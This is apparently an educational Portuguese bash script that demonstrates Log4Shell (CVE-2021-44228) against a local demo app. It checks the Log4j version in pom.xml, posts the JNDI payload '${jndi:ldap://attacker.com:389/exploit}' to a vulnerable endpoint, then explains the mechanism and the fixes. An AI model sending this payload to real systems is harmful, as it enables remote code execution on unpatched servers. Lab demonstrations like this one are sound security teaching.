#!/bin/bash

# Script para demonstrar dependência vulnerável Log4j
# APENAS PARA FINS EDUCATIVOS

echo "========================================"
echo "VULNERABILIDADE: LOG4J VULNERÁVEL"
echo "========================================"
echo

BASE_URL="http://localhost:8080"

echo "SIMULAÇÃO EDUCATIVA: CVE-2021-44228 (Log4Shell)"
echo

# 1. Verificar versão vulnerável no pom.xml
echo "1. Dependência vulnerável detectada"
echo "-----------------------------------"
LOG4J_VERSION=$(grep -A 5 "log4j-core" pom.xml | grep "<version>" | head -1 | sed 's/.*<version>\(.*\)<\/version>.*/\1/' | tr -d ' ')

if [ ! -z "$LOG4J_VERSION" ]; then
    echo "Log4j versão: $LOG4J_VERSION"
    if [[ "$LOG4J_VERSION" < "2.15.0" ]]; then
        echo "VULNERÁVEL ao CVE-2021-44228 (Log4Shell)"
        echo "VERSÃO PERIGOSA! NÃO USE EM PRODUÇÃO!"
    else
        echo "Versão não vulnerável"
    fi
else
    echo "AVISO: Log4j não encontrado no pom.xml"
fi
echo

# 2. Enviar payload Log4Shell
echo "2. Enviando payload Log4Shell"
echo "-----------------------------"
PAYLOAD='${jndi:ldap://attacker.com:389/exploit}'
echo "Payload: $PAYLOAD"
echo

echo "Comando:"
echo "curl -X POST '$BASE_URL/api/vulneravel/log4shell' -d '{\"message\":\"$PAYLOAD\"}'"
echo

RESPONSE=$(curl -s -X POST "$BASE_URL/api/vulneravel/log4shell" \
  -H "Content-Type: application/json" \
  -d "{\"message\":\"$PAYLOAD\"}")

echo "Resposta:"
echo "$RESPONSE"
echo
echo "Payload enviado para os logs via endpoint vulnerável"
echo

# 3. Resultado da demonstração
echo "3. Resultado da simulação"
echo "-------------------------"
if [ ! -z "$LOG4J_VERSION" ] && [[ "$LOG4J_VERSION" < "2.15.0" ]]; then
    echo "Log4j $LOG4J_VERSION seria VULNERÁVEL!"
    echo
    echo "VERIFICAR NO CONSOLE DA APLICAÇÃO E ARQUIVO logs/security-demo.log:"
    echo "Procure por uma das seguintes mensagens:"
    echo "• 'Error looking up JNDI resource [ldap://attacker.com:389/exploit]'"
    echo "• 'Unable to locate resource ldap://attacker.com:389/exploit'"
    echo "• Tentativas de conexão LDAP nos logs"
    echo
    echo "COMO A VULNERABILIDADE FUNCIONA:"
    echo "• Payload '\${jndi:ldap://attacker.com:389/exploit}' é enviado"
    echo "• Log4j interpreta e executa a expressão JNDI"
    echo "• Tenta conectar ao servidor LDAP malicioso"
    echo "• Com servidor real, código malicioso seria baixado e executado"
    echo
    echo "CVE-2021-44228 (Log4Shell) simulado com sucesso!"
    echo
    echo "CORREÇÃO:"
    echo "• Atualizar para Log4j >= 2.17.0"
    echo "• Ou definir -Dlog4j2.formatMsgNoLookups=true"
    echo "• Ou definir LOG4J_FORMAT_MSG_NO_LOOKUPS=true"
else
    echo "Versão atual é segura - simulação educativa ativa"
    echo "VERIFICAR NO CONSOLE DA APLICAÇÃO:"
    echo "• Mensagens de simulação do comportamento vulnerável"
    echo "• Logs mostrando o que aconteceria em versão vulnerável"
    echo "• Demonstração educativa do impacto de Log4Shell"
fi

echo "========================================"
echo "   LOG4J VULNERÁVEL - DEMONSTRAÇÃO"
echo "========================================"